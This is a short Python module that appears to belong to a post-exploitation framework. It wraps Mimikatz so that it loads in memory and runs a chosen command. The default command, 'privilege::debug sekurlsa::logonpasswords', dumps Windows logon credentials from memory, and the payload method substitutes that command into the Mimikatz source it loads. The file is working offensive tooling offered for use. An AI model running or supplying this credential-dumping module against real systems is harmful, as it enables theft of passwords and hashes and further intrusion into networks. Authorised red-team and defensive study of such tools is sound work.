class STModule:
    def __init__(self):
        self.name = 'ipy/mimikatz'
        self.language = 'ipy'
        self.description = 'Loads Mimikatz in memory and executes the specified command'
        self.author = '@byt3bl33d3r'
        self.options = {
            'Command': {
                'Description'   :   'Mimikatz command to run',
                'Required'      :   False,
                'Value'         :   'privilege::debug sekurlsa::logonpasswords'
            }
        }

    def payload(self):
        with open('modules/ipy/src/mimikatz.py', 'r') as module_src:
            src = module_src.read()
            src = src.replace("MIMIKATZ_COMMAND", self.options['Command']['Value'])
            return src
